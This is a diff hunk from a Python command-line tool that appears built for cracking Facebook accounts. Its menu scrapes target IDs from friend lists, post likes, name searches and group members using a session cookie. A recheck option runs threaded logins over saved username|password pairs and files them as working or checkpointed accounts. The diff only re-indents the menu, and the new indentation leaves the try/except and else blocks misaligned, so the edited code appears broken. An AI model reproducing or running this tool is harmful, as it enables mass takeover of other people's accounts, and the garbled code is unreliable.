@@ -214,81 +214,81 @@ def mbf2d():
                             print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def menu():   
-                   krik_krik_milzu()
-                   peak()
-                   uwu()
-                   aink('\033[1;92mANDA SEDANG AKTIF!')
-                   aink('\033[1;97m╭────────────────────────────────────────────────────')
-                   aink('\033[1;91m|[\033[1;93m1\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂFŤÂŘ ŤÊMÂŇ 💎')
-                   aink('\033[1;91m|[\033[1;93m2\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ŁÎĶÊ PÔŠŠŤÎŇĞÂŇ 💎')
-                   aink('\033[1;91m|[\033[1;93m3\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ PÊÑČÂŘÎÂŇ ŇÂMÂ 💎')
-                   aink('\033[1;91m|[\033[1;93m4\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ĞŘÔÛP 💎')
-                   aink('\033[1;91m|[\033[1;93m5\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ŤÊMÂŇ 💎')
-                   aink('\033[1;91m|[\033[1;93m6\033[1;97m]🤖 \033[00mŁÎHÂŤ HÂŠÎŁ ŘÔĶÊĎ 💎')
-                   aink('\033[1;97m|────────────────────────────────────────────────────')
-                   print()
-                   ngtd = input('\033[90m╰─>[>_<]👉 \033[1;93m ')
-                   if ngtd =="":
-                         exit("\033[00m[\033[91m!\033[00m] Dont be empty")
-                   elif ngtd == '1':
-                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
-                         username = getid(mbasic.format(url["href"]))
-                   elif ngtd == '2':
-                         username = input("\033[90m> \033[00mURL Post : \033[1;92m")
-                         if username == "":
-                                 exit("\033[00m[\033[91m!\033[00m] Dont be empty")
-                         elif 'www.facebook' in username:
-                                 username = username.replace('www.facebook','mbasic.facebook')
-                         elif 'm.facebook.com' in username:
-                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
-                         username = fromlikes(username)
-                   elif ngtd == '3':
-                         knf = input("\033[90m> \033[00mquery : \033[1;92m")
-                         username = bysearch(mbasic.format('/search/people/?q='+knf))
-                         if len(username) == 0:
-                                 exit("\033[90m[\033[91m!\033[00m] no result")
-                   elif ngtd == '4':
-                         print("\033[90m> \033[00mcan only take \033[91m100 \033[00mIDs ")
-                         grab = input("\033[90m> \033[00mID group : \033[1;92m")
-                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
-                         if len(username) == 0:
-                                 exit("\033[00m[\033[91m!\033[00m]ID wrong")
-                   elif ngtd == '5':
-                         knf = input("\033[90m> \033[00mUsername/Id : \033[1;92m")
-                         if knf.isdigit():
-                                 user = "/profile.php?id=" + knf
-                         else:
-                                 user = "/" + knf
-                         try:
-                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
-                                 username = getid(mbasic.format(user))
-                         except TypeError:
-                                 exit("\033[00m[\033[91m!\033[00m] User Not Found ")
-                   elif ngtd == '6':
-                         try:
-                                 file1 = open("results-check.txt").read()
-                                 file2 = open("results-life.txt").read()
-                                 a = file1 + file2
-                                 final = a.strip().split("\n")
-                                 final = set(final)
-                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] accounts to check ")
-                                 with ThreadPoolExecutor(max_workers=10) as ex:
-                                         for user in final:
-                                                 a = user.split("|")
-                                                 ex.submit(login,(a[0]),(a[1]),(True))
-                                 os.remove("results-check.txt")
-                                 os.remove("results-life.txt")
-                                 for x in life:
-                                         with open('results-life.txt','a') as f:
-                                                 f.write(x+'\n')
-                                 for x in chek:
-                                         with open('results-check.txt','a') as f:
-                                                 f.write(x+"\n")
+             krik_krik_milzu()
+             peak()
+             uwu()
+             aink('\033[1;92mANDA SEDANG AKTIF!')
+             aink('\033[1;97m╭────────────────────────────────────────────────────')
+             aink('\033[1;91m|[\033[1;93m1\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂFŤÂŘ ŤÊMÂŇ 💎')
+             aink('\033[1;91m|[\033[1;93m2\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ŁÎĶÊ PÔŠŠŤÎŇĞÂŇ 💎')
+             aink('\033[1;91m|[\033[1;93m3\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ PÊÑČÂŘÎÂŇ ŇÂMÂ 💎')
+             aink('\033[1;91m|[\033[1;93m4\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ĞŘÔÛP 💎')
+             aink('\033[1;91m|[\033[1;93m5\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ŤÊMÂŇ 💎')
+             aink('\033[1;91m|[\033[1;93m6\033[1;97m]🤖 \033[00mŁÎHÂŤ HÂŠÎŁ ŘÔĶÊĎ 💎')
+             aink('\033[1;97m|────────────────────────────────────────────────────')
+             print()
+             ngtd = input('\033[90m╰─>[>_<]👉 \033[1;93m ')
+             if ngtd =="":
+                   exit("\033[00m[\033[91m!\033[00m] Dont be empty")
+             elif ngtd == '1':
+                   url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
+                   username = getid(mbasic.format(url["href"]))
+             elif ngtd == '2':
+                   username = input("\033[90m> \033[00mURL Post : \033[1;92m")
+                   if username == "":
+                           exit("\033[00m[\033[91m!\033[00m] Dont be empty")
+                   elif 'www.facebook' in username:
+                           username = username.replace('www.facebook','mbasic.facebook')
+                   elif 'm.facebook.com' in username:
+                           username = username.replace('m.facebook.com','mbasic.facebook.com')
+                   username = fromlikes(username)
+             elif ngtd == '3':
+                   knf = input("\033[90m> \033[00mquery : \033[1;92m")
+                   username = bysearch(mbasic.format('/search/people/?q='+knf))
+                   if len(username) == 0:
+                           exit("\033[90m[\033[91m!\033[00m] no result")
+             elif ngtd == '4':
+                   print("\033[90m> \033[00mcan only take \033[91m100 \033[00mIDs ")
+                   grab = input("\033[90m> \033[00mID group : \033[1;92m")
+                   username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
+                   if len(username) == 0:
+                           exit("\033[00m[\033[91m!\033[00m]ID wrong")
+             elif ngtd == '5':
+                   knf = input("\033[90m> \033[00mUsername/Id : \033[1;92m")
+                   if knf.isdigit():
+                           user = "/profile.php?id=" + knf
+                   else:   
+                           user = "/" + knf
+                   try:
+                           user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
+                           username = getid(mbasic.format(user))
+                   except TypeError:
+                           exit("\033[00m[\033[91m!\033[00m] User Not Found ")
+             elif ngtd == '6':
+                   try:
+                           file1 = open("results-check.txt").read()
+                           file2 = open("results-life.txt").read()
+                           a = file1 + file2
+                           final = a.strip().split("\n")
+                           final = set(final)
+                           print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] accounts to check ")
+                           with ThreadPoolExecutor(max_workers=10) as ex:
+                                   for user in final:
+                                           a = user.split("|")
+                                           ex.submit(login,(a[0]),(a[1]),(True))
+                           os.remove("results-check.txt")
+                           os.remove("results-life.txt")
+                           for x in life:
+                                  with open('results-life.txt','a') as f:
+                                          f.write(x+'\n')
+                           for x in chek:
+                                  with open('results-check.txt','a') as f:
+                                          f.write(x+"\n")
 
-                                 print("\n\033[00m[\033[92m✓\033[00m] Done")
-                                 print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
-                         except FileNotFoundError:
-                                 exit("\033[00m[\033[91m!\033[00m] you not have a results")
+                         print("\n\033[00m[\033[92m✓\033[00m] Done")
+                         print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
+             except FileNotFoundError:
+                         exit("\033[00m[\033[91m!\033[00m] you not have a results")
                    else:
                          exit("\033[00m[\033[91m!\033[00m] wrong choice")
                    print()
